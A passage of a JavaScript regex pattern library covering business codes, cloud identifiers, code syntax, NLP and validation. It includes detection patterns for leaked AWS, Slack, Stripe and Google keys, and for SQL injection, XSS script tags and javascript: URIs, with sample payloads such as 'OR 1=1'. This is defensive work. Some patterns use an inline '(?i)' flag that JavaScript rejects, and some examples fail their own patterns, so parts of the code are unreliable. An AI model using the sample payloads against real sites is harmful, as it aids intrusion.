    explanation: 'Matches IPv6 CIDR notation.',
    examples: ['2001:db8::/32'],
  },

  /* Business & Finance */
  invoiceNumber: {
    id: 'invoice-number',
    category: 'Business',
    name: 'Invoice Numbers',
    description: 'Extract invoice identifiers',
    pattern: '\\bINV[- ]?\\d{4,10}\\b',
    flags: 'gi',
    explanation: 'Matches invoice number patterns.',
    examples: ['INV-2024-001', 'INV 9999'],
  },

  productVariant: {
    id: 'product-variant',
    category: 'Business',
    name: 'Product Variant Codes',
    description: 'Extract product variant identifiers',
    pattern: '[A-Z]{2,5}-[A-Z0-9]{2,6}',
    flags: 'g',
    explanation: 'Matches product variant codes.',
    examples: ['SKU-BLUE', 'PROD-LG'],
  },

  ean13: {
    id: 'ean-13',
    category: 'Business',
    name: 'EAN-13 Barcodes',
    description: 'Extract EAN-13 barcode numbers',
    pattern: '\\b\\d{13}\\b',
    flags: 'g',
    explanation: 'Matches 13-digit EAN codes.',
    examples: ['5901234123457'],
  },

  usdCents: {
    id: 'usd-cents',
    category: 'Payment',
    name: 'USD Currency (Strict)',
    description: 'Extract USD amounts with cents',
    pattern: '\\$\\d{1,3}(?:,\\d{3})*(?:\\.\\d{2})?',
    flags: 'g',
    explanation: 'Matches USD currency format.',
    examples: ['$99.99', '$1,000.50'],
  },


  /* Scientific & Measurements */
  chemicalFormula: {
    id: 'chemical-formula',
    category: 'Science',
    name: 'Chemical Formula',
    description: 'Extract chemical element notation',
    pattern: '\\b[A-Z][a-z]?[0-9]*\\b',
    flags: 'g',
    explanation: 'Matches chemical formulas.',
    examples: ['H2O', 'NaCl', 'Ca'],
  },

  measurement: {
    id: 'measurement',
    category: 'Science',
    name: 'Measurements with Units',
    description: 'Extract numeric measurements',
    pattern: '\\b\\d+(?:\\.\\d+)?\\s?(cm|mm|kg|lb|m|km|L|ml)\\b',
    flags: 'gi',
    explanation: 'Matches values with units.',
    examples: ['25kg', '3.2m', '500ml'],
  },

  percent: {
    id: 'percent',
    category: 'Numbers',
    name: 'Percentages',
    description: 'Extract percentage values',
    pattern: '\\b\\d+(?:\\.\\d+)?%\\b',
    flags: 'g',
    explanation: 'Matches percentage notation.',
    examples: ['50%', '99.9%'],
  },

  scientificSymbols: {
    id: 'scientific-symbols',
    category: 'Science',
    name: 'Scientific Symbols',
    description: 'Extract values with scientific units',
    pattern: '\\b\\d+(?:\\.\\d+)?\\s?(µ|Ω|°C|°F|ppm|mol)\\b',
    flags: 'g',
    explanation: 'Matches scientific notation with symbols.',
    examples: ['25°C', '50ppm', '5Ω'],
  },

  /* Text Processing */
  parentheses: {
    id: 'parentheses',
    category: 'Text',
    name: 'Text Inside Parentheses',
    description: 'Extract text inside ()',
    pattern: '\\(([^)]*)\\)',
    flags: 'g',
    explanation: 'Matches content within parentheses.',
    examples: ['(example)', '(multiple words here)'],
  },

  brackets: {
    id: 'brackets',
    category: 'Text',
    name: 'Text Inside [brackets]',
    description: 'Extract text inside []',
    pattern: '\\[([^\\]]*)\\]',
    flags: 'g',
    explanation: 'Matches content within brackets.',
    examples: ['[example]', '[link title]'],
  },

  curlyBraces: {
    id: 'curly-braces',
    category: 'Text',
    name: 'Content Inside {braces}',
    description: 'Extract text inside {}',
    pattern: '\\{([^}]*)\\}',
    flags: 'g',
    explanation: 'Matches content within braces.',
    examples: ['{variable}', '{object key}'],
  },

  emailName: {
    id: 'email-name',
    category: 'Text',
    name: 'Email Display Name',
    description: 'Extract email display names',
    pattern: '"([^"]+)"\\s*<([^>]+)>',
    flags: 'g',
    explanation: 'Matches "Name" <email@example.com> format.',
    examples: ['"John Doe" <john@example.com>'],
  },

  sentence: {
    id: 'sentence',
    category: 'Text',
    name: 'Sentence Extractor',
    description: 'Extract complete sentences',
    pattern: '[A-Z][^.!?]*[.!?]',
    flags: 'g',
    explanation: 'Matches sentences ending with . ! or ?',
    examples: ['This is a sentence.', 'Is this a question?'],
  },

  /* Security - Enterprise */
  awsAccessKeyId: {
    id: 'aws-access-key-id',
    category: 'Security',
    name: 'AWS Access Key ID',
    description: 'Detect AWS access key IDs (AKIA...)',
    pattern: '\\bAKIA[0-9A-Z]{16}\\b',
    flags: 'g',
    explanation: 'Matches AWS access key format.',
    examples: ['AKIAIOSFODNN7EXAMPLE'],
  },

  awsSecretKeyId: {
    id: 'aws-secret-key-id',
    category: 'Security',
    name: 'AWS Secret Access Key',
    description: 'Detect AWS secret keys (Base64)',
    pattern: '(?i)\\b[0-9a-zA-Z/+]{40}\\b',
    flags: 'g',
    explanation: 'Matches AWS secret key patterns.',
    examples: ['wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLE'],
  },

  slackToken: {
    id: 'slack-token',
    category: 'Security',
    name: 'Slack Bot Token',
    description: 'Detect Slack API tokens',
    pattern: 'xox[baprs]-[A-Za-z0-9-]+',
    flags: 'g',
    explanation: 'Matches Slack token formats.',
    examples: ['xoxb-123456789-1234567890'],
  },

  stripeSecret: {
    id: 'stripe-secret',
    category: 'Security',
    name: 'Stripe Secret Key',
    description: 'Detect Stripe API secret keys',
    pattern: 'sk_(test|live)_[A-Za-z0-9]{24,}',
    flags: 'g',
    explanation: 'Matches Stripe secret key format.',
    examples: ['sk_test_4eC39HqLyjWDarhtT657Kq6q'],
  },

  gcpApiKey: {
    id: 'gcp-api-key',
    category: 'Security',
    name: 'Google API Keys',
    description: 'Detect Google Cloud API keys',
    pattern: 'AIza[0-9A-Za-z_-]{35}',
    flags: 'g',
    explanation: 'Matches GCP API key format.',
    examples: ['AIzaSyAGmL5HGsxKMrFqPBqBDSDhMfGAFJFl-Gg'],
  },

  jwtLoose: {
    id: 'jwt-loose',
    category: 'Security',
    name: 'JWT Tokens (Loose Matching)',
    description: 'Extract JWT header and payload',
    pattern: '\\b[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\b',
    flags: 'g',
    explanation: 'Matches loose JWT token patterns.',
    examples: ['eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWI'],
  },

  /* SQL / Databases */
  sqlComparison: {
    id: 'sql-compare',
    category: 'SQL',
    name: 'SQL Comparisons',
    description: 'Extract SQL WHERE conditions',
    pattern: '\\b\\w+\\s*(=|<>|!=|<|>|<=|>=)\\s*[^\\s,;]+',
    flags: 'gi',
    explanation: 'Matches SQL comparison operators.',
    examples: ['id = 5', 'status != "active"'],
  },

  sqlCreateTable: {
    id: 'sql-create-table',
    category: 'SQL',
    name: 'CREATE TABLE Statements',
    description: 'Extract CREATE TABLE blocks',
    pattern: 'CREATE\\s+TABLE\\s+[^(]+\\([^;]+\\)',
    flags: 'gi',
    explanation: 'Matches SQL CREATE TABLE syntax.',
    examples: ['CREATE TABLE users (id INT, name VARCHAR(255))'],
  },

  sqlInsert: {
    id: 'sql-insert',
    category: 'SQL',
    name: 'INSERT INTO',
    description: 'Extract INSERT statements',
    pattern: 'INSERT\\s+INTO\\s+\\w+\\s*\\([^)]*\\)\\s*VALUES\\s*\\([^;]+\\)',
    flags: 'gi',
    explanation: 'Matches SQL INSERT statements.',
    examples: ['INSERT INTO users (id, name) VALUES (1, "John")'],
  },

  jsonl: {
    id: 'jsonl',
    category: 'Data',
    name: 'JSONL Records',
    description: 'Extract JSON Lines records',
    pattern: '^\\{.*?\\}$',
    flags: 'gm',
    explanation: 'Matches one JSON object per line.',
    examples: ['{"id": 1, "name": "John"}'],
  },

  csvValue: {
    id: 'csv-value',
    category: 'Data',
    name: 'CSV Values',
    description: 'Extract CSV field values',
    pattern: '(?:^|,)([^,]*)',
    flags: 'g',
    explanation: 'Matches CSV delimited values.',
    examples: ['field1', 'field2', '"quoted field"'],
  },

  /* Programming - Language Specific */
  tsInterface: {
    id: 'ts-interface',
    category: 'Programming',
    name: 'TypeScript Interfaces',
    description: 'Extract TypeScript interface definitions',
    pattern: 'interface\\s+[A-Za-z0-9_]+\\s*\\{[\\s\\S]*?\\}',
    flags: 'g',
    explanation: 'Matches TypeScript interface blocks.',
    examples: ['interface User { id: number; name: string; }'],
  },

  goFunc: {
    id: 'go-func',
    category: 'Programming',
    name: 'Go Function Definitions',
    description: 'Extract Go function signatures',
    pattern: 'func\\s+[A-Za-z0-9_]+\\([^)]*\\)',
    flags: 'g',
    explanation: 'Matches Go function declarations.',
    examples: ['func Add(a int, b int) int'],
  },

  rustMacro: {
    id: 'rust-macro',
    category: 'Programming',
    name: 'Rust Macro Invocations',
    description: 'Extract Rust macro calls',
    pattern: '\\b\\w+!\\([^)]*\\)',
    flags: 'g',
    explanation: 'Matches Rust macro syntax.',
    examples: ['println!("Hello")', 'vec![1, 2, 3]'],
  },

  pythonClass: {
    id: 'python-class',
    category: 'Programming',
    name: 'Python Class Definitions',
    description: 'Extract Python class definitions',
    pattern: '^class\\s+[A-Za-z_][A-Za-z0-9_]*',
    flags: 'gm',
    explanation: 'Matches Python class declarations.',
    examples: ['class User:', 'class MyClass(Base):'],
  },

  bashVar: {
    id: 'bash-var',
    category: 'Programming',
    name: 'Bash Variable Assignments',
    description: 'Extract bash variable assignments',
    pattern: '\\b[A-Za-z_][A-Za-z0-9_]*=([^\\s]+)',
    flags: 'g',
    explanation: 'Matches shell variable assignments.',
    examples: ['USER=john', 'PATH=/usr/bin'],
  },

  /* Cloud Services */
  s3Object: {
    id: 's3-object',
    category: 'Cloud',
    name: 'AWS S3 Object URLs',
    description: 'Extract S3 object URLs',
    pattern: 'https?:\\/\\/[A-Za-z0-9.-]+\\.s3\\.amazonaws\\.com\\/[^\\s]+',
    flags: 'g',
    explanation: 'Matches S3 bucket object URLs.',
    examples: ['https://mybucket.s3.amazonaws.com/file.pdf'],
  },

  awsArn: {
    id: 'aws-arn',
    category: 'Cloud',
    name: 'AWS ARN',
    description: 'Extract AWS ARN identifiers',
    pattern: '\\barn:aws:[A-Za-z0-9-]+:[A-Za-z0-9-]*:\\d+:.*',
    flags: 'g',
    explanation: 'Matches AWS ARN format.',
    examples: ['arn:aws:iam::123456789012:user/john'],
  },

  gcpBucket: {
    id: 'gcp-bucket',
    category: 'Cloud',
    name: 'Google Cloud Storage Bucket',
    description: 'Extract GCP bucket URLs',
    pattern: 'gs:\\/\\/[A-Za-z0-9._-]+\\/[A-Za-z0-9._/-]+',
    flags: 'g',
    explanation: 'Matches GCS bucket paths.',
    examples: ['gs://my-bucket/path/to/file.txt'],
  },

  azureBlob: {
    id: 'azure-blob',
    category: 'Cloud',
    name: 'Azure Blob Storage',
    description: 'Extract Azure blob URLs',
    pattern: 'https?:\\/\\/[A-Za-z0-9]+\\.blob\\.core\\.windows\\.net\\/[A-Za-z0-9-]+\\/[A-Za-z0-9._-]+',
    flags: 'g',
    explanation: 'Matches Azure blob storage URLs.',
    examples: ['https://myaccount.blob.core.windows.net/container/blob.txt'],
  },

  /* AI / ML */
  pytorchModel: {
    id: 'pytorch-model',
    category: 'AI',
    name: 'PyTorch Model File',
    description: 'Extract .pt model file names',
    pattern: '\\b\\w+\\.pt\\b',
    flags: 'gi',
    explanation: 'Matches PyTorch model files.',
    examples: ['model.pt', 'checkpoint_123.pt'],
  },

  numpyNpy: {
    id: 'numpy-npy',
    category: 'AI',
    name: 'NumPy NPY Files',
    description: 'Extract .npy numpy files',
    pattern: '\\b\\w+\\.npy\\b',
    flags: 'gi',
    explanation: 'Matches NumPy array files.',
    examples: ['data.npy', 'embeddings.npy'],
  },

  mlImports: {
    id: 'ml-imports',
    category: 'AI',
    name: 'ML Python Imports',
    description: 'Detect ML library imports',
    pattern: 'import\\s+(torch|tensorflow|sklearn|numpy|pandas)',
    flags: 'gi',
    explanation: 'Matches ML framework imports.',
    examples: ['import torch', 'import tensorflow as tf'],
  },

  huggingfaceModel: {
    id: 'hf-model',
    category: 'AI',
    name: 'HuggingFace Model Identifiers',
    description: 'Extract HuggingFace model IDs',
    pattern: '[A-Za-z0-9_.-]+\\/[A-Za-z0-9_.-]+',
    flags: 'g',
    explanation: 'Matches HuggingFace model names.',
    examples: ['bert-base-uncased', 'openai/whisper-base'],
  },

  /* Package Management */
  npmPackage: {
    id: 'npm-package',
    category: 'Programming',
    name: 'NPM Package Names',
    description: 'Extract npm package identifiers',
    pattern: '@?[A-Za-z0-9._-]+\\/[A-Za-z0-9._-]+|[A-Za-z0-9._-]+',
    flags: 'g',
    explanation: 'Matches npm package names.',
    examples: ['react', '@babel/core', 'lodash-es'],
  },

  semverFull: {
    id: 'semver-full',
    category: 'Programming',
    name: 'Semantic Version (Full)',
    description: 'Extract semantic versions with metadata',
    pattern: '\\b\\d+\\.\\d+\\.\\d+(?:-[A-Za-z0-9.-]+)?(?:\\+[A-Za-z0-9.-]+)?',
    flags: 'g',
    explanation: 'Matches full SemVer format.',
    examples: ['1.2.3', '1.0.0-beta+001'],
  },

  dockerTag: {
    id: 'docker-tag',
    category: 'DevOps',
    name: 'Docker Image Tags',
    description: 'Extract Docker image references',
    pattern: '[A-Za-z0-9._/-]+:[A-Za-z0-9._-]+',
    flags: 'g',
    explanation: 'Matches Docker image:tag format.',
    examples: ['ubuntu:20.04', 'myregistry.azurecr.io/myapp:latest'],
  },

  k8sName: {
    id: 'k8s-name',
    category: 'DevOps',
    name: 'Kubernetes Resource Names',
    description: 'Extract k8s resource names',
    pattern: '\\b[a-z0-9]([-a-z0-9]*[a-z0-9])?\\b',
    flags: 'g',
    explanation: 'Matches k8s naming conventions.',
    examples: ['my-deployment', 'nginx-pod'],
  },

  /* Documentation */
  yamlKeyValue: {
    id: 'yaml-key-value',
    category: 'Formatting',
    name: 'YAML Key/Value',
    description: 'Extract YAML key:value pairs',
    pattern: '^\\s*[A-Za-z0-9_-]+:\\s*.+$',
    flags: 'gm',
    explanation: 'Matches YAML key-value entries.',
    examples: ['name: John', 'age: 30'],
  },

  mdCodeFence: {
    id: 'md-code-fence',
    category: 'Formatting',
    name: 'Markdown ``` Code Blocks',
    description: 'Extract markdown code blocks',
    pattern: '```[\\s\\S]*?```',
    flags: 'g',
    explanation: 'Matches Markdown code fences.',
    examples: ['```javascript\ncode\n```'],
  },

  mdBold: {
    id: 'md-bold',
    category: 'Formatting',
    name: 'Markdown Bold',
    description: 'Extract **bold** text',
    pattern: '\\*\\*([^*]+)\\*\\*',
    flags: 'g',
    explanation: 'Matches Markdown bold text.',
    examples: ['**bold text**'],
  },

  /* UI / Frontend */
  domEvent: {
    id: 'dom-event',
    category: 'Web',
    name: 'DOM Event Listener Bindings',
    description: 'Extract addEventListener event names',
    pattern: 'addEventListener\\(["\'](\\w+)["\']',
    flags: 'g',
    explanation: 'Matches DOM event bindings.',
    examples: ['addEventListener("click"'],
  },

  cssVar: {
    id: 'css-var',
    category: 'Web',
    name: 'CSS Custom Properties',
    description: 'Extract CSS variable definitions',
    pattern: '--[A-Za-z0-9_-]+:\\s*[^;]+;',
    flags: 'g',
    explanation: 'Matches CSS custom properties.',
    examples: ['--primary-color: #007bff;'],
  },

  reactProp: {
    id: 'react-prop',
    category: 'Programming',
    name: 'React Prop Attributes',
    description: 'Extract React component props',
    pattern: '\\b[A-Za-z0-9]+(?=")',
    flags: 'g',
    explanation: 'Matches React prop names.',
    examples: ['className=', 'onClick=', 'disabled='],
  },

  /* Error Detection */
  errorMessage: {
    id: 'error-message',
    category: 'Errors',
    name: 'Recognize Common Error Messages',
    description: 'Detect error keywords in text',
    pattern: '(Exception|Error|Traceback|UnhandledPromiseRejection)',
    flags: 'gi',
    explanation: 'Matches common error indicators.',
    examples: ['Error:', 'Exception:', 'Traceback'],
  },

  javaStack: {
    id: 'java-stack',
    category: 'Errors',
    name: 'Java Stack Trace Lines',
    description: 'Extract Java stack trace entries',
    pattern: 'at\\s+[A-Za-z0-9_.]+\\([^)]*\\)',
    flags: 'g',
    explanation: 'Matches Java stack trace format.',
    examples: ['at java.lang.String.charAt(String.java:658)'],
  },

  /* Text Analysis */
  emailDomain: {
    id: 'email-domain',
    category: 'Text',
    name: 'Email Domains Only',
    description: 'Extract email domain portion',
    pattern: '@([A-Za-z0-9.-]+)',
    flags: 'g',
    explanation: 'Matches domain from email addresses.',
    examples: ['gmail.com', 'company.org'],
  },

  capitalizedWord: {
    id: 'capitalized-word',
    category: 'Text',
    name: 'Proper Names (Capitalized Words)',
    description: 'Extract capitalized words (potential names)',
    pattern: '\\b[A-Z][a-z]+\\b',
    flags: 'g',
    explanation: 'Matches capitalized words.',
    examples: ['John', 'Alice', 'Microsoft'],
  },

  /* Security - Threat Detection */
  sqlInjection: {
    id: 'sql-injection',
    category: 'Security',
    name: 'SQL Injection Indicators',
    description: 'Detect SQL injection attack patterns',
    pattern: '(?i)(union(\\s+all)?\\s+select|sleep\\s*\\(|benchmark\\s*\\(|or\\s+1=1)',
    flags: 'g',
    explanation: 'Matches common SQL injection payloads.',
    examples: ['UNION ALL SELECT', 'OR 1=1'],
  },

  xssScript: {
    id: 'xss-script',
    category: 'Security',
    name: 'XSS <script> Injection',
    description: 'Detect script tag injection',
    pattern: '<script[^>]*>[\\s\\S]*?<\\/script>',
    flags: 'gi',
    explanation: 'Matches script tag injection vectors.',
    examples: ['<script>alert(1)</script>'],
  },

  javascriptUri: {
    id: 'javascript-uri',
    category: 'Security',
    name: 'JavaScript URL Schemes',
    description: 'Detect javascript: URIs',
    pattern: 'javascript:\\s*[A-Za-z0-9]',
    flags: 'gi',
    explanation: 'Matches javascript: protocol handlers.',
    examples: ['javascript:alert(1)'],
  },

  htmlEventHandler: {
    id: 'html-event-handler',
    category: 'Security',
    name: 'Inline Event Handlers (XSS Risk)',
    description: 'Detect onclick, onload, etc.',
    pattern: '\\son[a-z]+\\s*=',
    flags: 'gi',
    explanation: 'Matches HTML event handler attributes.',
    examples: ['onclick=', 'onload=', 'onerror='],
  },

  base64Executable: {
    id: 'base64-exe',
    category: 'Security',
    name: 'Base64 Encoded Executables',
    description: 'Detect base64 .exe/.dll headers',
    pattern: 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAA',
    flags: 'g',
    explanation: 'Matches MZ header (PE executable).',
    examples: ['TVqQAAMAAAAEAAAA//8AALgAAAAAAAA'],
  },

  ipPort: {
    id: 'ip-port',
    category: 'Security',
    name: 'IPv4 + Port Pairs',
    description: 'Extract IP address with port',
    pattern: '\\b(?:\\d{1,3}\\.){3}\\d{1,3}:(\\d{2,5})\\b',
    flags: 'g',
    explanation: 'Matches IP:port notation.',
    examples: ['192.168.1.1:8080', '10.0.0.1:443'],
  },

  passwordAssign: {
    id: 'password-assign',
    category: 'Security',
    name: 'Password Assignments in Code',
    description: 'Detect password variable assignments',
    pattern: '(?i)(password|passwd|pwd)\\s*=\\s*["\']([^"\']+)["\']',
    flags: 'g',
    explanation: 'Matches hardcoded passwords.',
    examples: ['password = "secret123"'],
  },

  /* NLP / Linguistic */
  passiveVoice: {
    id: 'passive-voice',
    category: 'NLP',
    name: 'Passive Voice Indicators',
    description: 'Detect passive voice constructions',
    pattern: '\\b(be|is|was|were|been|being)\\s+[A-Za-z]+ed\\b',
    flags: 'gi',
    explanation: 'Matches passive voice patterns.',
    examples: ['is broken', 'was written', 'were done'],
  },

  emotionalTone: {
    id: 'emotional-tone',
    category: 'NLP',
    name: 'Strong Emotional Tone',
    description: 'Detect emphatic expressions',
    pattern: '(\\!\\!+|\\?\\?+|\\b[A-Z]{4,}\\b)',
    flags: 'g',
    explanation: 'Matches emotional indicators.',
    examples: ['!!!', '???', 'AMAZING'],
  },

  repeatedWords: {
    id: 'repeated-words',
    category: 'NLP',
    name: 'Repeated Words',
    description: 'Find duplicate consecutive words',
    pattern: '\\b(\\w+)\\s+\\1\\b',
    flags: 'gi',
    explanation: 'Matches repeated words.',
    examples: ['the the', 'hello hello'],
  },

  leetProfanity: {
    id: 'leet-profanity',
    category: 'Moderation',
    name: 'Obfuscated Profanity (1337)',
    description: 'Detect leetspeak obfuscation',
    pattern: '(?i)\\b(f+|ph)[\\W_]*u+[\\W_]*c+[\\W_]*k+\\b',
    flags: 'g',
    explanation: 'Matches obfuscated profanity.',
    examples: ['f***k', 'ph_u_c_k'],
  },

  sentenceBoundary: {
    id: 'sentence-boundary',
    category: 'NLP',
    name: 'Sentence Boundaries',
    description: 'Extract sentence segments',
    pattern: '[^.!?]+[.!?]',
    flags: 'g',
    explanation: 'Matches sentence boundaries.',
    examples: ['Hello world.', 'How are you?'],
  },

  /* Government / Legal */
  usPassport: {
    id: 'us-passport',
    category: 'Government',
    name: 'US Passport Number',
    description: 'Extract US passport numbers',
    pattern: '\\b[0-9]{9}\\b',
    flags: 'g',
    explanation: 'Matches 9-digit passport format.',
    examples: ['123456789'],
  },

  ein: {
    id: 'ein',
    category: 'Government',
    name: 'US EIN',
    description: 'Extract Employer ID numbers',
    pattern: '\\b\\d{2}-\\d{7}\\b',
    flags: 'g',
    explanation: 'Matches EIN format.',
    examples: ['12-3456789'],
  },

  ibanNumber: {
    id: 'iban-number',
    category: 'Finance',
    name: 'IBAN Numbers',
    description: 'Extract International Bank Accounts',
    pattern: '\\b[A-Z]{2}[0-9]{2}[A-Z0-9]{1,30}\\b',
    flags: 'gi',
    explanation: 'Matches IBAN format.',
    examples: ['DE89370400440532013000'],
  },

  swift: {
    id: 'swift',
    category: 'Finance',
    name: 'SWIFT/BIC Codes',
    description: 'Extract SWIFT bank codes',
    pattern: '\\b[A-Z]{6}[A-Z0-9]{2}([A-Z0-9]{3})?\\b',
    flags: 'g',
    explanation: 'Matches SWIFT/BIC format.',
    examples: ['DEUTDEFF', 'CHASCHUS'],
  },

  /* Hardware / Network */
  macAddressPattern: {
    id: 'mac-address-pattern',
    category: 'Network',
    name: 'MAC Address',
    description: 'Extract MAC addresses',
    pattern: '\\b(?:[0-9A-Fa-f]{2}[:-]){5}[0-9A-Fa-f]{2}\\b',
    flags: 'g',
    explanation: 'Matches MAC address format.',
    examples: ['00:1A:2B:3C:4D:5E', '00-1A-2B-3C-4D-5E'],
  },

  ipv6Pattern: {
    id: 'ipv6-pattern',
    category: 'Network',
    name: 'IPv6 Addresses',
    description: 'Extract IPv6 addresses',
    pattern: '\\b([0-9A-Fa-f]{1,4}:){1,7}[0-9A-Fa-f]{0,4}\\b',
    flags: 'g',
    explanation: 'Matches IPv6 format.',
    examples: ['2001:db8::1', 'fe80::1'],
  },

  userAgentBrowser: {
    id: 'ua-browser',
    category: 'Web',
    name: 'Browser Identifier Extraction',
    description: 'Extract browser name from user agent',
    pattern: '\\b(Chrome|Firefox|Safari|Edge|Opera|MSIE)\\b',
    flags: 'gi',
    explanation: 'Matches browser identifiers.',
    examples: ['Chrome', 'Firefox', 'Safari'],
  },

  /* Text Sanitization */
  doubleSpaces: {
    id: 'double-spaces',
    category: 'Cleaning',
    name: 'Double Spaces',
    description: 'Find multiple consecutive spaces',
    pattern: ' {2,}',
    flags: 'g',
    explanation: 'Matches double spaces for cleanup.',
    examples: ['multiple  spaces'],
  },

  nonAscii: {
    id: 'non-ascii',
    category: 'Cleaning',
    name: 'Non-ASCII Characters',
    description: 'Extract non-ASCII characters',
    pattern: '[^\\x00-\\x7F]',
    flags: 'g',
    explanation: 'Matches non-ASCII bytes.',
    examples: ['é', '中', '🚀'],
  },

  hyphenBreak: {
    id: 'hyphen-break',
    category: 'Cleaning',
    name: 'Hyphenated OCR Wraps',
    description: 'Fix hyphenated line breaks in OCR',
    pattern: '(\\w+)-\\s*(\\w+)',
    flags: 'g',
    explanation: 'Matches hyphen breaks from OCR.',
    examples: ['some-\\nthing'],
  },

  /* Cloud Identifiers */
  awsLambdaName: {
    id: 'aws-lambda',
    category: 'Cloud',
    name: 'AWS Lambda Name',
    description: 'Extract Lambda function names',
    pattern: '\\b[A-Za-z0-9-_]+-lambda-[A-Za-z0-9-_]+\\b',
    flags: 'g',
    explanation: 'Matches AWS Lambda naming pattern.',
    examples: ['my-app-lambda-handler'],
  },

  awsIamRole: {
    id: 'aws-iam-role',
    category: 'Cloud',
    name: 'AWS IAM Role',
    description: 'Extract IAM role names',
    pattern: '\\b[A-Za-z0-9-_]+Role\\b',
    flags: 'g',
    explanation: 'Matches IAM role naming.',
    examples: ['AdminRole', 'LambdaExecutionRole'],
  },

  gcpServiceAccount: {
    id: 'gcp-service-account',
    category: 'Cloud',
    name: 'GCP Service Account Email',
    description: 'Extract GCP service account emails',
    pattern: '[A-Za-z0-9-]+@([A-Za-z0-9-]+)\\.iam\\.gserviceaccount\\.com',
    flags: 'gi',
    explanation: 'Matches GCP service account format.',
    examples: ['my-app@my-project.iam.gserviceaccount.com'],
  },

  /* Code Parsing */
  jsFunctionDecl: {
    id: 'js-function-decl',
    category: 'Programming',
    name: 'JS Function Declarations',
    description: 'Extract JavaScript function declarations',
    pattern: 'function\\s+[A-Za-z0-9_]+\\s*\\([^)]*\\)',
    flags: 'g',
    explanation: 'Matches JS function syntax.',
    examples: ['function myFunc()'],
  },

  jsArrowFunction2: {
    id: 'js-arrow-func-2',
    category: 'Programming',
    name: 'Arrow Functions',
    description: 'Extract arrow function expressions',
    pattern: '[A-Za-z0-9_]+\\s*=\\s*\\([^)]*\\)\\s*=>',
    flags: 'g',
    explanation: 'Matches arrow function syntax.',
    examples: ['const func = (x) =>'],
  },

  cssRgbColor: {
    id: 'css-rgb-color',
    category: 'Colors',
    name: 'CSS RGB Colors',
    description: 'Extract CSS RGB/RGBA colors',
    pattern: 'rgba?\\(([^)]+)\\)',
    flags: 'gi',
    explanation: 'Matches CSS color functions.',
    examples: ['rgb(255, 0, 0)', 'rgba(0, 0, 0, 0.5)'],
  },

  jsonPairStrict: {
    id: 'json-pair-strict',
    category: 'Web',
    name: 'Strict JSON Pair',
    description: 'Extract JSON key-value pairs strictly',
    pattern: '"([A-Za-z0-9_]+)"\\s*:\\s*("[^"]*"|\\d+|true|false|null)',
    flags: 'g',
    explanation: 'Matches strict JSON format.',
    examples: ['"name": "John"', '"age": 30'],
  },

  mdItalic: {
    id: 'md-italic',
    category: 'Web',
    name: 'Markdown Italics',
    description: 'Extract markdown italic text',
    pattern: '\\*([^*]+)\\*|_([^_]+)_',
    flags: 'g',
    explanation: 'Matches markdown italics.',
    examples: ['*italic*', '_underscore_'],
  },

  /* Data Engineering */
  keyValue: {
    id: 'key-value',
    category: 'Data',
    name: 'key=value Pairs',
    description: 'Extract key=value pairs',
    pattern: '\\b([A-Za-z0-9_]+)=([^\\s]+)',
    flags: 'g',
    explanation: 'Matches key=value notation.',
    examples: ['name=John', 'age=30'],
  },

  jsonPath: {
    id: 'json-path',
    category: 'Data',
    name: 'JSON Path-like Tokens',
    description: 'Extract dot-notation paths',
    pattern: '[A-Za-z0-9_]+(?:\\.[A-Za-z0-9_]+)+',
    flags: 'g',
    explanation: 'Matches nested property paths.',
    examples: ['user.profile.name', 'obj.prop.value'],
  },

  queryStringKey: {
    id: 'query-key',
    category: 'Web',
    name: 'Query String Keys',
    description: 'Extract URL query parameter keys',
    pattern: '(?:\\?|&)([A-Za-z0-9_]+)=',
    flags: 'g',
    explanation: 'Matches query string parameters.',
    examples: ['?id=', '&name='],
  },

  /* Error Detection */
  nodeError: {
    id: 'node-error',
    category: 'Errors',
    name: 'Node.js Error Stack',
    description: 'Extract Node.js error blocks',
    pattern: 'Error:.*?\\n(?:\\s+at.*?\\n)+',
    flags: 'g',
    explanation: 'Matches Node.js stack traces.',
    examples: ['Error: Cannot find module'],
  },

  pythonTraceback: {
    id: 'python-traceback',
    category: 'Errors',
    name: 'Python Traceback',
    description: 'Extract Python error tracebacks',
    pattern: 'Traceback \\(most recent call last\\):[\\s\\S]+?\\w+Error: .*',
    flags: 'g',
    explanation: 'Matches Python exceptions.',
    examples: ['Traceback (most recent call last):'],
  },

  bashCmdNotFound: {
    id: 'bash-cmd-not-found',
    category: 'Errors',
    name: 'Bash Command Not Found',
    description: 'Extract bash "command not found" errors',
    pattern: 'command not found: \\w+',
    flags: 'gi',
    explanation: 'Matches bash error messages.',
    examples: ['command not found: python3'],
  },

  /* User Input / Validation */
  alphanumericUsername: {
    id: 'alphanumeric-username',
    category: 'Validation',
    name: 'Alphanumeric Username',
    description: 'Validate alphanumeric usernames',
    pattern: '\\b[A-Za-z][A-Za-z0-9_]{2,15}\\b',
    flags: 'g',
    explanation: 'Matches valid username format.',
    examples: ['john_doe', 'User123'],
  },

  strongPassword: {
    id: 'strong-password',
    category: 'Validation',
    name: 'Strong Password',
    description: 'Validate strong password requirements',
    pattern: '(?=.*[A-Z])(?=.*[a-z])(?=.*\\d)(?=.*[!@#$%^&*]).{8,}',
    flags: '',
    explanation: 'Matches strong passwords (uppercase, lowercase, digit, symbol, 8+ chars).',
    examples: ['Secure@Pass1'],
  },

  emailLocalStrict: {
    id: 'email-local-strict',
    category: 'Validation',
    name: 'Email Local Part Only',
    description: 'Extract email username part',
    pattern: '[A-Za-z0-9._%+-]+(?=@)',
    flags: 'g',
    explanation: 'Matches email local part.',
    examples: ['john.doe', 'user+tag'],
  },

  /* Extreme / NLP */
  englishNumbers: {
    id: 'english-numbers',
    category: 'NLP',
    name: 'English Written Numbers',
    description: 'Extract numbers written as words',
    pattern: '\\b(zero|one|two|three|four|five|six|seven|eight|nine|ten|eleven|twelve|thirteen|hundred|thousand|million|billion)\\b',
    flags: 'gi',
    explanation: 'Matches English number words.',
    examples: ['one', 'twenty three', 'million'],
  },

  /* Code Feature Extraction */
  functionSignature: {
    id: 'function-signature',
    category: 'Programming',
    name: 'Generic Function Signatures',
    description: 'Extract function signatures in any language',
    pattern: '\\b[A-Za-z_][A-Za-z0-9_]*\\s*\\([^)]*\\)',
    flags: 'g',
    explanation: 'Matches function declarations across languages.',
    examples: ['myFunc(a, b)', 'foo(x)', 'doThing()'],
  },

  varDecl: {
    id: 'var-decl',
    category: 'Programming',
    name: 'Variable Declarations',
    description: 'Extract variable declarations',
